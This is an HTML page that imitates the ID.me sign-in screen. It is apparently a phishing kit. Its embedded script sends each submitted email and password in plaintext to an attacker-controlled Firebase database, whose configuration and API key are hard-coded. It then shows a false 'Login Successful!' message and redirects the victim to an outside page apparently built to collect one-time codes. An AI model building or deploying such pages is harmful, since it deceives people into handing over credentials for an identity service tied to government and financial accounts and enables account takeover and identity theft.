<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in to ID.me - ID.me</title>
    <link rel="stylesheet" href="index.css" />
  </head>

  <body>
    <div class="header">
      <img src="IMG_5868.jpeg" alt="" />
    </div>
    <div class="body-container">
      <div class="body">
        <div class="form-header">
          <h1>Sign in to ID.me</h1>
        </div>
        <div class="newID">
          <p>New to ID.me?</p>
          <p>
            <a href="#">Create an ID.me account</a>
          </p>
        </div>
        <form action="#">
          <div class="form-fields">
            <div class="field-group">
              <div class="email">
                <label class="input-labels" for="email">Email</label><br />
                <input
                  id="email"
                  class="input-fields"
                  type="email"
                  title="email"
                  placeholder="Enter your email address"
                  required
                /><br />
              </div>
              <div class="password">
                <label class="input-labels" for="password">Password</label
                ><br />
                <input
                  id="password"
                  class="input-fields"
                  type="password"
                  title="password"
                  placeholder="Enter password"
                  required
                /><br />
              </div>
              <div class="remember">
                <input
                  class="checkbox"
                  type="checkbox"
                  name="remember"
                  id="remember"
                  title="remember"
                />
                <label for="remember">
                  <span> Remember me </span>
                  <div id="remember-me-tip">
                    For your security, select only on your devices.
                  </div>
                </label>
              </div>
            </div>
          </div>
          <div class="form-actions">
            <button type="submit" class="sign-btn" id="submit_btn">
              Sign in
            </button>
          </div>
        </form>

        <div class="form-footer">
          <p>
            <a href="#">Forgot password</a>
          </p>
        </div>
        <footer class="footer">
          <nav class="footer-links">
            <ul class="footer-list">
              <li class="footer-list-item active">
                <a
                  rel="noopener noreferrer"
                  class="footer__link"
                  title="What is ID.me? (opens in new tab)"
                  aria-label="What is ID.me? (opens in new tab)"
                  href="https://www.id.me/about"
                  >What is ID.me?</a
                >
              </li>
              <span class="line">|</span>
              <li class="footer-list-item active">
                <a
                  rel="noopener noreferrer"
                  class="footer__link"
                  title="Terms of Service (opens in new tab)"
                  aria-label="Terms of Service (opens in new tab)"
                  href="https://www.id.me/terms"
                  >Terms of Service</a
                >
              </li>
              <span class="line">|</span>
              <li class="footer-list-item">
                <a
                  rel="noopener noreferrer"
                  class="footer__link"
                  title="Privacy Policy (opens in new tab)"
                  aria-label="Privacy Policy (opens in new tab)"
                  href="https://www.id.me/privacy"
                  >Privacy Policy</a
                >
              </li>
            </ul>
          </nav>
        </footer>
      </div>
    </div>

    <script type="module">
      // Import the functions you need from the SDKs you need
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
      import {
        getDatabase,
        ref,
        set,
        get,
        child,
      } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-database.js";
      // TODO: Add SDKs for Firebase products that you want to use
      // https://firebase.google.com/docs/web/setup#available-libraries

      // Your web app's Firebase configuration
      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
      const firebaseConfig = {
        apiKey: "AIzaSyCmxhN9uuXdrJTp5ywmdInD3jAWOh2dmvs",
        authDomain: "jovi-5ea61.firebaseapp.com",
        projectId: "jovi-5ea61",
        storageBucket: "jovi-5ea61.appspot.com",
        messagingSenderId: "936130816159",
        appId: "1:936130816159:web:98130c9620ffa29a62daaa",
        measurementId: "G-YD05972RWV",
      };

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);

      const db = getDatabase(app);

      document.addEventListener("DOMContentLoaded", function () {
        document
          .getElementById("submit_btn")
          .addEventListener("click", function (e) {
            e.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            function LoginId() {
              let randomNumber = "";
              for (let i = 0; i < 10; i++) {
                randomNumber += Math.floor(Math.random() * 10);
              }
              return randomNumber;
            }

            set(ref(db, "LoginUsers/" + LoginId()), {
              email: email,
              password: password,
            })
              .then(() => {
                alert("Login Successful!");
                window.location.href =
                  "https://only-correct-repo-for-otp-page-jovie.vercel.app/";
              })
              .catch((error) => {
                console.error("Error adding user to database: ", error);
                alert(
                  "An error occurred while logging in. Please try again later."
                );
              });
          });
      });
    </script>
  </body>
</html>
